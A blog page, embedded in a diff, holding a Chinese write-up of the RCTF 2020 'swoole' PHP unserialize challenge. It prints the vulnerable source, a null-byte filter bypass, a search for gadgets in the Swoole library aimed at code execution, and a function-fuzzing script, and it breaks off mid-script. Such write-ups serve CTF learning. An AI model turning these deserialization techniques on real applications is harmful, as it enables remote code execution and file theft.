@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":"enable","show_result":false,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="上周末打了由ROIS举办的RCTF2020，zsx出了道php 反序列化的签到题-swoole（一下午出完了），然而我肝了两天，但是没有做出来。 这道题和以往找thinkphp的pop gadget不太一样，以往的难度是php文件数量多，方法多，硬着头皮找基本都能找到能够可控的参数。（上述类型的机械劳动应该能用程序搞定，codeql快支持全世界最好的语言呀，或者用AST自己撸一个，甚至有篇pape">
+<meta name="keywords" content="php,writeup,unserialize">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rctf-2020-swoole-writeup">
+<meta property="og:url" content="https://blog.sometimenaive.com/2020/06/04/rctf_2020_swoole_writeup/index.html">
+<meta property="og:site_name" content="yxxx&#39;s blog">
+<meta property="og:description" content="上周末打了由ROIS举办的RCTF2020，zsx出了道php 反序列化的签到题-swoole（一下午出完了），然而我肝了两天，但是没有做出来。 这道题和以往找thinkphp的pop gadget不太一样，以往的难度是php文件数量多，方法多，硬着头皮找基本都能找到能够可控的参数。（上述类型的机械劳动应该能用程序搞定，codeql快支持全世界最好的语言呀，或者用AST自己撸一个，甚至有篇pape">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601161531170.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601170323090.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601180011783.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601180048712.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601181004750.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601181034374.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200602095531988.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200602160316294.png">
+<meta property="og:updated_time" content="2020-06-04T02:09:26.715Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="rctf-2020-swoole-writeup">
+<meta name="twitter:description" content="上周末打了由ROIS举办的RCTF2020，zsx出了道php 反序列化的签到题-swoole（一下午出完了），然而我肝了两天，但是没有做出来。 这道题和以往找thinkphp的pop gadget不太一样，以往的难度是php文件数量多，方法多，硬着头皮找基本都能找到能够可控的参数。（上述类型的机械劳动应该能用程序搞定，codeql快支持全世界最好的语言呀，或者用AST自己撸一个，甚至有篇pape">
+<meta name="twitter:image" content="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601161531170.png">
+  <link rel="canonical" href="https://blog.sometimenaive.com/2020/06/04/rctf_2020_swoole_writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>rctf-2020-swoole-writeup | yxxx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yxxx's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://blog.sometimenaive.com/2020/06/04/rctf_2020_swoole_writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yxxx">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yxxx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">rctf-2020-swoole-writeup
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2020-06-04 10:00:17 / Modified: 10:09:26" itemprop="dateCreated datePublished" datetime="2020-06-04T10:00:17+08:00">2020-06-04</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>上周末打了由ROIS举办的RCTF2020，zsx出了道php 反序列化的签到题-swoole（一下午出完了），然而我肝了两天，但是没有做出来。</p>
+<p>这道题和以往找thinkphp的pop gadget不太一样，以往的难度是php文件数量多，方法多，硬着头皮找基本都能找到能够可控的参数。（上述类型的机械劳动应该能用程序搞定，codeql快支持全世界最好的语言呀，或者用AST自己撸一个，甚至有篇paper专门研究了如何自动找gadget）（此处挖坑加一）</p>
+<p>这次php文件不太多，但是构造的角度还是非常巧妙的。但是我思路不够开阔，没能把两部分联系起来。</p>
+<p>但是真正的强者wupco，还是搞出了RCE。</p>
+<p>我觉得这个题目可以作为面试题目：谈谈你印象最深的一道CTF题目？的候选答案。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li><code>array_walk</code> 第一个参数可以是<code>$object</code></li>
+<li>php自定义函数的参数数量可以多传但是不能少传</li>
+<li>可以把<code>s</code> 换成<code>S</code> 然后<code>\x00</code> 换成<code>\00</code></li>
+<li>反序列化也可以通过外带的方式读文件（比如curl上传文件，mysql客户端读文件）</li>
+<li>可以通过反射修改对象的属性</li>
+</ul>
+<h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><p>题目直接给出了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Swoole\Runtime::enableCoroutine($flags = SWOOLE_HOOK_ALL);</span><br><span class="line">$http = <span class="keyword">new</span> Swoole\Http\Server(<span class="string">"0.0.0.0"</span>, <span class="number">9501</span>);</span><br><span class="line">$http-&gt;on(<span class="string">"request"</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">(Swoole\Http\Request $request, Swoole\Http\Response $response)</span> </span>&#123;</span><br><span class="line">        Swoole\Runtime::enableCoroutine();</span><br><span class="line">        $response-&gt;header(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line">        <span class="comment">// $response-&gt;sendfile('/flag');</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($request-&gt;get[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">            <span class="comment">// Prevent racing condition</span></span><br><span class="line">            <span class="comment">// ob_start();phpinfo();</span></span><br><span class="line">            <span class="comment">// return $response-&gt;end(ob_get_clean());</span></span><br><span class="line">            <span class="keyword">return</span> $response-&gt;sendfile(<span class="string">'phpinfo.txt'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($request-&gt;get[<span class="string">'code'</span>])) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $code = $request-&gt;get[<span class="string">'code'</span>];</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'/\x00/'</span>, $code)) &#123;</span><br><span class="line">                    $a = unserialize($code);</span><br><span class="line">                    $a();</span><br><span class="line">                    $a = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\Throwable $e) &#123;</span><br><span class="line">                var_dump($code);</span><br><span class="line">                var_dump($e-&gt;getMessage());</span><br><span class="line">                <span class="comment">// do nothing</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $response-&gt;end(<span class="string">'Done'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $response-&gt;sendfile(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$http-&gt;start();</span><br></pre></td></tr></table></figure>
+<p>代码非常简短，而且给了phpinfo和flag的位置。通过查看phpinfo发现swoole对应的版本是4.4.18。swoole是个扩展，然后还有个library有php代码。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>FBI警告</strong> 下面的分析有部分是在做题的时候真正分析的，有的是看了writeup之后分析的（这部分可能有种事后诸葛亮的感觉）</p>
+<p>绕过<code>\x00</code>的前一段时间刚在P神的小密圈见到，就是将<code>s</code>换成<code>S</code>，<code>\x00</code> 换成 <code>\00</code> 就行了。这个绕过不是重点。</p>
+<p>直接将传的<code>$code</code> 进行了反序列化，然后直接执行了<code>$a()</code> 。直接调用对象会触发<code>__invoke()</code> 这个魔术方法。在library里面搜索<code>__invoke</code> 能够找到一处。</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601161531170.png" alt="image-20200601161531170"></p>
+<p>这里我们可以发现，<code>__object</code> 是可控的，也就是<code>$object</code> 是可控的但是<code>...$arguments</code> 是空的。到这一步我们有能力调用一次<code>$func()</code>。根据 <a href="https://www.php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/functions.variable-functions.php</a> <code>$func</code> 可以是</p>
+<ul>
+<li>字符串，比如<code>$x=&#39;phpinfo&#39;;$x();</code></li>
+<li>可以是个数组<ul>
+<li>可以调用静态方法，比如<code>[&quot;A&quot;, &quot;static_method&quot;]</code></li>
+<li>也可以调用一个对象的方法，比如<code>[$obj, &quot;method&quot;]</code> , 如果传<code>[$obj, &quot;setatic_method&quot;]</code> 也是可以调用静态方法的。</li>
+</ul>
+</li>
+<li>还可以是个闭包函数<ul>
+<li><code>$f = function () {echo 2333;}; $f();</code></li>
+<li><code>$f = create_function(&#39;&#39;, &#39;echo 2333;&#39;);$f();</code></li>
+</ul>
+</li>
+</ul>
+<p>比较遗憾的是闭包函数不支持序列化和反序列化。</p>
+<p>对第一种情况进行序列化，显示出<code>PHP Warning:  Uncaught Exception: Serialization of &#39;Closure&#39; is not allowed</code></p>
+<p><code>create_function</code> 创造出的匿名函数是有函数名的<code>\x00lambda_02</code> 但是这个也没在服务器那边创建，所以也不能用。</p>
+<p>如果只传一个字符串，干不了啥事，连<code>phpinfo</code>都显示不出来，执行了<code>phpinfo</code>只会在控制台显示，不会在响应里面显示。</p>
+<p>所以我们貌似只剩下了一种选择，传个数组<code>[$obj, &quot;method&quot;]</code>, 唯一的限制是没有参数。其实我这里思维狭隘了，以为得有<code>__invoke</code> 才行，不是这样的，如果<code>$code</code>直接反序列化出来的是一个数组，然后再执行，也是可以的。这两者的效果是一样的，但是我用<code>__invoke</code> 多了一步。</p>
+<p>根据上面的分析，下一步就是搜索不带参数的函数。</p>
+<p><code>public function \S+\(\)</code></p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601170323090.png" alt="image-20200601170323090"></p>
+<p>有100多个，通过一个个筛查，排除不调用其他函数的，找到了这么几个有用的。</p>
+<ul>
+<li><p><code>ConnectionPool.php</code> </p>
+<ul>
+<li><code>fill()</code></li>
+<li><code>get()</code></li>
+</ul>
+</li>
+<li><p><code>Server.php</code></p>
+<ul>
+<li><code>start()</code></li>
+</ul>
+</li>
+<li><p><code>Handler.php</code></p>
+<ul>
+<li><code>exec()</code></li>
+</ul>
+</li>
+<li><p><code>PDOProxy.php</code> </p>
+<ul>
+<li><code>reconnect()</code></li>
+</ul>
+</li>
+</ul>
+<p>上面可能会漏掉，可变参数<code>...$arg</code> 这种形式。</p>
+<p>所以再搜索一次<code>public function \S+\(.*\.\.\.\$\S+\)</code> 这样的没有</p>
+<p>还得再搜一次<code>__call</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">(string $name, array $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__object-&gt;&#123;$name&#125;(...$arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>大部分的<code>__call</code> 是这种形式的。</p>
+<p>如果调用<code>$obj-&gt;xxx()</code> 会转化成<code>$this-&gt;__object-&gt;xxx()</code> 回去找<code>$this-&gt;__object</code> 这个对象有没有<code>xxx</code> 这个方法，而不是找它的<code>xxx</code>属性，如果是用属性当做函数名得这样写：<code>($this-&gt;__object-&gt;{$name})(...$arguments);</code></p>
+<p>有<code>__call</code>方法的类有</p>
+<ul>
+<li><code>PDOProxy</code></li>
+<li><code>MysqliProxy</code></li>
+<li><code>MysqliStatementProxy</code></li>
+<li><code>PDOStatementProxy</code></li>
+</ul>
+<p>刚开始看的是<code>Handler.php</code> 实现了<code>CURL</code>，又给出了flag的位置，本来打算看能不能利用它进行文件上传。</p>
+<p>控制上传的地方有两处</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601180011783.png" alt="image-20200601180011783"></p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601180048712.png" alt="image-20200601180048712"></p>
+<p>第一个需要传的<code>$this-&gt;infile</code> 是个<code>resource</code> 类型的不支持反序列列化。第二个<code>CURLFile</code> 也不支持反序列化。然后又试了直接传<code>xxx=@/flag</code> 也不行。文件上传至此就夭折了。</p>
+<p>继续看<code>handler.php</code> 发现有两个可控函数<code>headFunction</code> 和 <code>readFunction</code></p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p><img src="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601181004750.png" alt="image-20200601181004750"></p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/6/image-20200601181034374.png" alt="image-20200601181034374"></p>
+<p>但是第一个参数是个<code>object</code>，当时没找到一个函数能够这样搞，只能想到一个<code>create_function</code> 但是要求第一个参数是字符串，而且这个字符串也有要求得是<code>&#39;&#39;</code>, <code>$x,$y</code> 这种。但是这个<code>$this</code>没有<code>toString</code>的方法 。 然后就凉了，这个有办法搞吗？确实有办法搞，wupco就是找到了一个函数。不清楚他是怎么找的，我能不能Fuzz一下呢。</p>
+<p>fuzz 脚本</p>
+<p><code>9test.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $client;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $info = [</span><br><span class="line">        <span class="string">'url'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'content_type'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'http_code'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'header_size'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'request_size'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'filetime'</span> =&gt; <span class="number">-1</span>,</span><br><span class="line">        <span class="string">'ssl_verify_result'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'redirect_count'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'total_time'</span> =&gt; <span class="number">5.3E-5</span>,</span><br><span class="line">        <span class="string">'namelookup_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'connect_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'pretransfer_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'size_upload'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'size_download'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'speed_download'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'speed_upload'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'download_content_length'</span> =&gt; <span class="number">-1.0</span>,</span><br><span class="line">        <span class="string">'upload_content_length'</span> =&gt; <span class="number">-1.0</span>,</span><br><span class="line">        <span class="string">'starttransfer_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'redirect_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">        <span class="string">'redirect_url'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'primary_ip'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'certinfo'</span> =&gt; [],</span><br><span class="line">        <span class="string">'primary_port'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'local_ip'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'local_port'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'http_version'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'protocol'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'ssl_verifyresult'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'scheme'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $withHeaderOut = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $withFileTime = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $urlInfo;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $postData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $infile;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $infileSize = PHP_INT_MAX;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $outputStream;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $proxyType;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $proxy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $proxyPort = <span class="number">1080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $proxyUsername;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $proxyPassword;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $clientOptions = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $followLocation = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $autoReferer = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $maxRedirects;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $withHeader = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $nobody = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">    <span class="keyword">private</span> $headerFunction;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">    <span class="keyword">private</span> $readFunction;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">    <span class="keyword">private</span> $writeFunction;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">    <span class="keyword">private</span> $progressFunction;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $returnTransfer = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $method = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $headers = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $transfer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $errCode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $errMsg = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $failOnError = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $closed = <span class="keyword">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuzz</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $funcs = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">        <span class="comment">//$length = count($funcs);</span></span><br><span class="line">        <span class="comment">//echo($length);</span></span><br><span class="line">        <span class="keyword">echo</span> $funcs[%d];</span><br><span class="line">        $funcs[%d](<span class="keyword">$this</span>, <span class="string">"123444"</span>, <span class="number">1234</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$a-&gt;fuzz();</span><br></pre></td></tr></table></figure>
+<p><code>fuzz.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"9test.php"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    php = f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1703</span>):</span><br><span class="line">    tmp = php%(i,i)</span><br><span class="line">    res = subprocess.run([<span class="string">'php'</span>, <span class="string">"-r"</span>, tmp], capture_output=<span class="literal">True</span>)</span><br><span class="line">    stdout = res.stdout</span><br><span class="line">    stderr = res.stderr</span><br><span class="line">    <span class="keyword">if</span> <span 